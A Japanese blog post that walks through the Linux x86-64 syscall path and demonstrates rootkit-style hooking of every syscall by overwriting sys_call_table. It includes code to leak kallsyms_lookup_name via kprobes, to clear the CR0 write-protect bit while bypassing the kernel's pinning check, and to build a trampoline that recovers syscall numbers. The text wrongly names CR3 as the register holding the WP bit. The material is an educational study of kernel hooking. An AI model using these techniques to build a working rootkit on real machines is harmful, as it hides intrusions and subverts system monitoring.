---
title: "Table Overwrite"
description: "System Call Tableを上書きしてのフック"
draft: false
---

Linux Kernel v5.13.0

## Syscall Hooking

Rootkitがなんらかのsyscall、若しくは全てのsyscallをフックしたいとします。このとき、フックの方法にはいくつかありますが、ここでは最も単純で直感的な「syscall tableを直接書き換える」方法を考えてみましょう。

### 古き日のSyscall呼び出しの流れ

まず、syscall呼び出しの流れを見てみましょう。

一昔前は`int 0x80`命令によってsyscallを呼び出していました。ご存知の通り`int`命令は割り込みを発生させる命令で、*IDTR*によって指される割り込みテーブルに登録された割り込みハンドラに処理が移ります。`int 0x80`なので、`0x80`番がシステムコールのエントリポイントということですね。
但し、なんか知らんけどいちいち割り込みを発生させるのはオーバーヘッドが大きいということで、最近では使われません。今でも呼び出すこと自体はできるのかは、知りません。あと、`sysenter`とかいうやつに関しては、聞いたこともありません。

### 現在のSyscall呼び出しの流れ

現在では、`int`の代わりに[`syscall`](https://www.felixcloutier.com/x86/syscall.html)を使います。こいつは、**IA32_LSTAR MSR**に指されるエントリポイントに処理を移します。なんか知らんけど`int`より早いらしいです。因みに、vDSOでuserlandにexportされているsyscallの場合はkernelに処理を移す必要すらありませんが、今回は無視します。

LSTAR MSRは、`syscall_init()`で初期化され、`entry_SYSCALL_64`を指します:

```c
// arch/x86/kernel/cpu/common.c
void syscall_init(void)
{
	wrmsr(MSR_STAR, 0, (__USER32_CS << 16) | __KERNEL_CS);
	wrmsrl(MSR_LSTAR, (unsigned long)entry_SYSCALL_64);

	wrmsrl(MSR_CSTAR, (unsigned long)ignore_sysret);
	wrmsrl_safe(MSR_IA32_SYSENTER_CS, (u64)GDT_ENTRY_INVALID_SEG);
	wrmsrl_safe(MSR_IA32_SYSENTER_ESP, 0ULL);
	wrmsrl_safe(MSR_IA32_SYSENTER_EIP, 0ULL);

	/* Flags to clear on syscall */
	wrmsrl(MSR_SYSCALL_MASK,
	       X86_EFLAGS_TF|X86_EFLAGS_DF|X86_EFLAGS_IF|
	       X86_EFLAGS_IOPL|X86_EFLAGS_AC|X86_EFLAGS_NT);
}
```

`entry_SYSCALL_64`は、`arch/x86/entry/syscalls/syscall_64.S`で定義されています:

```S
/* arch/x86/entry/syscalls/syscall_64.S */
SYM_CODE_START(entry_SYSCALL_64)
	UNWIND_HINT_EMPTY

	swapgs
	movq	%rsp, PER_CPU_VAR(cpu_tss_rw + TSS_sp2)
	SWITCH_TO_KERNEL_CR3 scratch_reg=%rsp
	movq	PER_CPU_VAR(cpu_current_top_of_stack), %rsp

SYM_INNER_LABEL(entry_SYSCALL_64_safe_stack, SYM_L_GLOBAL)

	pushq	$__USER_DS				/* pt_regs->ss */
	pushq	PER_CPU_VAR(cpu_tss_rw + TSS_sp2)	/* pt_regs->sp */
	pushq	%r11					/* pt_regs->flags */
	pushq	$__USER_CS				/* pt_regs->cs */
	pushq	%rcx					/* pt_regs->ip */
SYM_INNER_LABEL(entry_SYSCALL_64_after_hwframe, SYM_L_GLOBAL)
	pushq	%rax					/* pt_regs->orig_ax */

	PUSH_AND_CLEAR_REGS rax=$-ENOSYS

	/* IRQs are off. */
	movq	%rax, %rdi
	movq	%rsp, %rsi
	call	do_syscall_64		/* returns with IRQs disabled */
```

改めて、アセンブリとかいう言語はAT&TとIntelとかいう2つの方言があって腹が立つ言語ですね。最初に*RSP*をkernelの退避領域に移した後、`PER_CPU_VAR`からちゃんとしたスタックのアドレスを取り出しています。あとはスタック上に`struct pt_regs`を構築した後、`do_syscall_64()`を呼び出しています。こいつこそが真のエントリポイントです:

```c
// arch/x86/entry/common.c
__visible noinstr void do_syscall_64(unsigned long nr, struct pt_regs *regs)
{
	add_random_kstack_offset();
	nr = syscall_enter_from_user_mode(regs, nr);

	if (likely(nr < NR_syscalls)) {
		nr = array_index_nospec(nr, NR_syscalls);
		regs->ax = sys_call_table[nr](regs);
	}
	syscall_exit_to_user_mode(regs);
}
```

`entry_SYSCALL_64`内の`movq %rax, %rdi`でsyscall番号(`nr`)を*RDI*に移しているので、第一引数は`nr`になっています。`regs`はスタック上に置いてあるレジスタ値で、あとで多分復元されます。`syscall_enter_from_user_mode()`はIRQ周りの何かとかtrace周りの何かをしてましたが、そんな重要じゃないです。`array_index_nospec()`は、`nr`が`NR_syscalls`を超えていないかチェックしています。最終的には、`sys_call_table`の`nr`番目を呼び出しているというところが大事です:

```c
// arch/x86/include/asm/syscall.h
typedef long (*sys_call_ptr_t)(const struct pt_regs *);

// arch/x86/entry/syscall_64.c
asmlinkage const sys_call_ptr_t sys_call_table[__NR_syscall_max+1] = {
	/*
	 * Smells like a compiler bug -- it doesn't work
	 * when the & below is removed.
	 */
	[0 ... __NR_syscall_max] = &__x64_sys_ni_syscall,
#include <asm/syscalls_64.h>
};
```

hackyですね。この部分、Linuxのコードの中で256本の指に入るくらいに好きな部分です。配列初期化の中に`#include`を入れ込んでるところも良いですが、`Smells like a compiler bug`というコメントもいい味を醸し出しています。最近のkernelだとこのコメント消されてるっぽいので、悲しいですね。それはさておき、`asm/syscalls_64.h`はこんな感じでひたすらにシステムコールハンドラが登録されています:

```h
arch/x86/include/generated/asm/syscalls_64.h
__SYSCALL_COMMON(0, sys_read)
__SYSCALL_COMMON(1, sys_write)
__SYSCALL_COMMON(2, sys_open)
```

`__SYSCALL_COMMON`は、`read`の場合に多分最終的にこんな感じに展開されます:

```c
[0] = __x64_sys_read
```

まぁ配列の初期化をするだけですね。さてさて、それはさておき、syscallの定義で利用される`SYSCALL_DEFINEx`マクロの内部で利用される`__SYSCALL_DEFINEx`マクロは、以下のように3つの関数を定義します:

```c
#define __SYSCALL_DEFINEx(x, name, ...)					\
	static long __se_sys##name(__MAP(x,__SC_LONG,__VA_ARGS__));	\
	static inline long __do_sys##name(__MAP(x,__SC_DECL,__VA_ARGS__));\
	__X64_SYS_STUBx(x, name, __VA_ARGS__)				\
	__IA32_SYS_STUBx(x, name, __VA_ARGS__)				\
	static long __se_sys##name(__MAP(x,__SC_LONG,__VA_ARGS__))	\
	{								\
		long ret = __do_sys##name(__MAP(x,__SC_CAST,__VA_ARGS__));\
		__MAP(x,__SC_TEST,__VA_ARGS__);				\
		__PROTECT(x, ret,__MAP(x,__SC_ARGS,__VA_ARGS__));	\
		return ret;						\
	}								\
	static inline long __do_sys##name(__MAP(x,__SC_DECL,__VA_ARGS__))
```

こいつらを展開するのはめんどいので、知りたい人は[このへん](https://www.kimullaa.com/posts/202006140247/)読んでください。取り敢えずのところ、`__x64_sys_xxx()`が`pt_regs`から値を取り出してハンドラ本体の引数として渡すということだけ理解してればOKです。ちょうどこの関数が、syscall tableに登録されていた各syscallのハンドラですね。

### フックできる場所

さて、ここまでの流れの中でフックに使えそうなポイントは2つくらいです。ほんとはもっとあるかもしれないけど。

まずは、`sys_call_table`の中に入っている各syscallのエントリポイント(`__x64_sys_xxx()`)を書き換えちゃうこと。これはなんか簡単そうですね。
もう一つが、MSRを書き換えてそもそものエントリポイントを書き換えちゃうこと。こっちはアセンブラで`entry_SYSCALL_64`のカスタム版を実装して自作の`do_syscall_64()`を呼び出す必要があるので、ちょっとめんどくさそうですね。しかしながら、用意に監視され得るkernel領域を書き換えるのではなくレジスタ値のみを書き換えればいいので、研究の文脈でいうとこっちのほうが有用だったりします。しなかったりもします。

今回は、前者の`sys_call_table`内のエントリを書き換える方法でいきます。


## `sys_call_table` hooking

概略を言うと、`sys_call_table`の中の関数ポインタを書き換えて、自作の関数に飛ばします。基本的にはそれだけです。

### `sys_call_table`のリーク

そもそもに、`sys_call_table`はexportされていません。なので、リークする必要があります。一昔前は`kallsyms_lookup_name()`という、任意のシンボルアドレスを教えてくれる便利関数がexportされていたらしいんですが、[こいつもv5.7からひきこもりになってしまいました](https://lwn.net/Articles/813350/)。なので、どうやってリークすれば良いのか迷ったんですが、まぁ有用なrootkitを作る必要はないので適当にkprobes使ってリークすることにしましょう。堂々とね！

```c
ulong get_kallsyms_lookup_name_addr (void) {
  ulong _kallsyms_lookup_name_addr;
  struct kprobe test_kp ={
    .symbol_name = "kallsyms_lookup_name",
  };

  if (register_kprobe(&test_kp) < 0) {
    pr_err("Failed to get addr of kallsyms_lookup_name.");
    return 0;
  };
  _kallsyms_lookup_name_addr = (ulong)test_kp.addr;
  unregister_kprobe(&test_kp);

  return _kallsyms_lookup_name_addr;
}
```

あとは`kallsyms_lookup_name()`を使えば任意のシンボルをリークできます。


### WP-bitと`sys_call_table`の書き換え

単純に`sys_call_table[0] = 0xDEADBEEF`とかってやると、permission errorでpanicします。これは`sys_call_table`の入ってるページにwrite protectionがかかっており、そこで発生したトラップハンドラの中で権限チェックされて落ちるからです。この書き込み保護は*CR3*レジスタの*WP*ビットをいじると無効化出来ます。kernelには`native_write_cr0()`という関数がexportされています:

```c
void native_write_cr0(unsigned long val)
{
	unsigned long bits_missing = 0;

set_register:
	asm volatile("mov %0,%%cr0": "+r" (val) : : "memory");

	if (static_branch_likely(&cr_pinning)) {
		if (unlikely((val & X86_CR0_WP) != X86_CR0_WP)) {
			bits_missing = X86_CR0_WP;
			val |= bits_missing;
			goto set_register;
		}
		/* Warn after we've set the missing bits. */
		WARN_ONCE(bits_missing, "CR0 WP bit went missing!?\n");
	}
}
EXPORT_SYMBOL(native_write_cr0);
```

小癪なことに、WPビットが立っていない場合には警告を出した上で無理やりWPを建てていますね。なので、自分で関数を用意してあげましょう:

```c
static void inline nosec_write_cr0(unsigned long val) {
	asm volatile("mov %0,%%cr0": "+r" (val) : : "memory");
}
```

あとはこんな感じで書き換えてあげればOK:

```c
static void disable_write_protection(void) {
  ulong cr0 = read_cr0();
  clear_bit(16, &cr0);
  nosec_write_cr0(cr0);
}

static void enable_write_protection(void) {
  ulong cr0 = read_cr0();
  set_bit(16, &cr0);
  nosec_write_cr0(cr0);
}
```

### フック関数

#### フックの問題点

さて、`sys_call_table`を書き換える準備が整いました。あとは、`sys_call_table`の中身を書き換える関数を用意してあげればOKです。取り敢えずは全てのsyscallをプリフックして`pr_info("NIRUGIRI")`と挨拶するようにしたいと考えましょう:

```c

int hijack_syscall_table_entries (void) {
  int ix;

  disable_write_protection();
    for (ix = 0; ix < nr_syscall_max - 1; ix++) {
      ((ulong *)sys_call_table)[ix] = (ulong)syscall_prehook;
    }
  enable_write_protection();

  return 0;
}

static inline long syscall_prehook(struct pt_regs *regs) {
  pr_info("NIRUGIRI");

  return cloned_sys_call_table[nr](regs);
}
```

書き換えを行う関数で使っている`sys_call_table`は、リークした`kallsyms_lookup_name()`を使ってアドレスを調べておく必要があります。同様に、`nr_syscall_max`もexportされていないため調べておく必要があります(単純にテーブルの中でNULLが出るまでのエントリ数をカウントすればOK)。

フック関数では`pr_info()`したあとで、オリジナルのハンドラを呼び出しています。`cloned_sys_call_table`は、オリジナルの`sys_call_table`のクローンです。`sys_call_table`内の関数ポインタは全て`syscall_prehook()`へのポインタに書き換えるため、オリジナルのハンドラを記憶しておく必要があり、こいつがそれをしてくれます。

さて、ここで問題が発生しました。**`nr`の値が分かりません**。`do_syscall_64`には第1引数(RDI)として`nr`が渡されるのですが、この値は`sys_call_table[nr](regs)`命令の最中に消されてしまいます:

```
ffffffff81ba82a0 <do_syscall_64>:
ffffffff81ba82a0:       55                      push   rbp
ffffffff81ba82a1:       49 89 f8                mov    r8,rdi
ffffffff81ba82a4:       48 89 e5                mov    rbp,rsp
ffffffff81ba82a7:       41 54                   push   r12
ffffffff81ba82a9:       49 89 f4                mov    r12,rsi
ffffffff81ba82ac:       0f 1f 44 00 00          nop    DWORD PTR [rax+rax*1+0x0]
ffffffff81ba82b1:       4c 89 c6                mov    rsi,r8
ffffffff81ba82b4:       4c 89 e7                mov    rdi,r12
ffffffff81ba82b7:       e8 b4 32 00 00          call   ffffffff81bab570 <syscall_enter_from_user_mode>
ffffffff81ba82bc:       48 3d be 01 00 00       cmp    rax,0x1be
ffffffff81ba82c2:       77 21                   ja     ffffffff81ba82e5 <do_syscall_64+0x45>
ffffffff81ba82c4:       48 3d bf 01 00 00       cmp    rax,0x1bf
ffffffff81ba82ca:       48 19 d2                sbb    rdx,rdx
ffffffff81ba82cd:       48 21 d0                and    rax,rdx
ffffffff81ba82d0:       4c 89 e7                mov    rdi,r12
ffffffff81ba82d3:       48 8b 04 c5 40 02 00    mov    rax,QWORD PTR [rax*8-0x7dfffdc0]
ffffffff81ba82da:       82
ffffffff81ba82db:       e8 80 b2 25 00          call   ffffffff81e03560 <__x86_indirect_thunk_rax>
```

`ffffffff81ba82bc (syscall_enter_from_user_mode)`の時点では、`RAX`に`nr`が入っています。しかしながら、`ffffffff81ba82d3`において`RAX`には`sys_call_table[nr]`の値が入ってしまいます。これによって、`nr`は完全に消えてしまいます。`nr`が分からないと、フック関数の中でどのオリジナルハンドラを呼び出せば良いのかが分かりません。悲しいですね。

#### `nr`を調べる

しかしながら、唯一の希望として`RAX`にはハンドラのアドレスが入っているということが分かっています。これだけだと、結局ハンドラのアドレス自体は全てプリフック関数のアドレスであるため`nr`の判定は不可能ですが、ここは少しhackyにいきましょう。まず、以下のようなカスマクロを用意します:

```c
#define REPEAT_1(x) x
#define REPEAT_2(x) REPEAT_1(x) x
#define REPEAT_4(x) REPEAT_2(x) REPEAT_2(x)
#define REPEAT_8(x) REPEAT_4(x) REPEAT_4(x)
#define REPEAT_16(x) REPEAT_8(x) REPEAT_8(x)
#define REPEAT_32(x) REPEAT_16(x) REPEAT_16(x)
#define REPEAT_64(x) REPEAT_32(x) REPEAT_32(x)
#define REPEAT_128(x) REPEAT_64(x) REPEAT_64(x)
#define REPEAT_256(x) REPEAT_128(x) REPEAT_128(x)
#define REPEAT_512(x) REPEAT_256(x) REPEAT_256(x)
```

マクロを繰り返してくれるマクロです。因みに、自前で用意しなくても[Boostライブラリ](https://www.boost.org/doc/libs/1_77_0/libs/preprocessor/doc/ref/repeat.html)が`BOOST_PP_REPEAT`というマクロを用意してくれてるらしいので、それを使ってもいいです。そのあと、以下のような関数を作ります:

```c
#define JMP_INST \
  asm volatile("push %0" : : "i" (jmp_thread)); \
  asm volatile("ret");

#define JMP_THREAD \
  REPEAT_512(JMP_INST)

static inline void jmp_thread(void) {
  asm volatile("jmp *%0" : : "r" (syscall_prehook) : "rax");
  JMP_THREAD
}
```

`jmp_thread()`関数の中では、先程用意したマクロによって512回分だけ`JMP_INST`が展開されます。`JMP_INST`は、`jmp_thread()`に対してジャンプするようなアセンブラ命令を展開します。`jmp_thread()`をコンパイルすると、こんな感じになります:

```S
000000000000e405 <jmp_thread>:
    e405:       48 c7 c2 00 00 00 00    mov    rdx,0x0
    e40c:       ff e2                   jmp    rdx
    e40e:       68 00 00 00 00          push   0x0
    e413:       c3                      ret
    e414:       68 00 00 00 00          push   0x0
    e419:       c3                      ret
    e41a:       68 00 00 00 00          push   0x0
    e41f:       c3                      ret
    e420:       68 00 00 00 00          push   0x0
    e425:       c3                      ret
    e426:       68 00 00 00 00          push   0x0
    e42b:       c3                      ret
    e42c:       68 00 00 00 00          push   0x0
    e431:       c3                      ret
    e432:       68 00 00 00 00          push   0x0
    e437:       c3                      ret
    e438:       68 00 00 00 00          push   0x0
    e43d:       c3                      ret
...
```

最初の`mov rdx,0x0`は`syscall_prehook()`のアドレスが、`push 0x0`となっているところには、後ほど`jmp_thread`のアドレスが入ります。勘の良い人ならお気づきの通り、syscallテーブル内のポインタを、`jmp_thread`内の異なる`push & ret`命令のアドレスに書き換えることで、全てのsyscallハンドラのアドレスが異なりつつも同じプリフック関数を呼び出すことが出来ます:

```c
int hijack_syscall_table_entries (void) {
  int ix;

  disable_write_protection();
    for (ix = 0; ix < nr_syscall_max - 1; ix++) {
      ((ulong *)sys_call_table)[ix] = (ulong)jmp_thread + 0x9 + 6 * ix;
    }
  enable_write_protection();

  return 0;
}
```

`0x9`は最初の`syscall_prehook()`に飛ぶ命令長で、`6`は`push & ret`1つ分の命令長です。これで、全てのハンドラは最終的に`syscall_prehook()`に飛びますが、そのアドレスは微妙に異なっているため`syscall_prehook()`内で`RAX`を調べることにより、もとの`nr`を得ることが出来ます:

```c
static inline long syscall_prehook(struct pt_regs *regs) {
  ulong rax, nr;

  asm volatile("mov %%rax, %0" : "=r" (rax));
  nr = (rax - (ulong)jmp_thread - 9) / 6;

  pr_info("NIRUGIRI");

  return cloned_sys_call_table[nr](regs);
}
```

やったね！

因みに、`asm volatile("jmp *%0" : : "r" (syscall_prehook) : "rax")`で適切にregister constraintを指定しないと、`RAX`がworking regsとして利用されてしまい、せっかく保持されているハンドラのアドレスが消え去ってしまいます。今回は`rax`を指定しているため、代わりに`rdx`が使われています。この辺のインラインアセンブラについては、[これ](https://wocota.hatenadiary.org/entry/20090628/1246188338)が詳しい感じがするので読みたい人はどうぞ。

それから、`JMP_INST`を`"jmp *%0" : : "r" (jmp_thread)`ではなく`push & ret`にしている理由ですが、前者にした場合アセンブラは以下のようになってしまいます:

```S
000000000000e405 <jmp_thread>:
    e405:       48 c7 c2 00 00 00 00    mov    rdx,0x0
    e40c:       ff e2                   jmp    rdx
    e40e:       48 c7 c0 00 00 00 00    mov    rax,0x0
    e415:       ff e0                   jmp    rax
    e417:       ff e0                   jmp    rax
    e419:       ff e0                   jmp    rax
    e41b:       ff e0                   jmp    rax
    e41d:       ff e0                   jmp    rax
    e41f:       ff e0                   jmp    rax
    e421:       ff e0                   jmp    rax
    e423:       ff e0                   jmp    rax
    e425:       ff e0                   jmp    rax
...
```

最初に一度だけ`rax`に`jmp_thread`の値を入れたっきり、二度と代入してくれませんね...。これでは、syscallハンドラから`jmp_thread()`の途中に飛んだ時、すでに`RAX`に入っているアドレス、すなわち今現在のアドレスにジャンプすることになり、無限ジャンプを引き起こしてしまいます。というわけで、`push & ret`にしたらいい感じに繰り返してくれる上に、レジスタ値を損なわなくて済むので、今回はそうなりました。
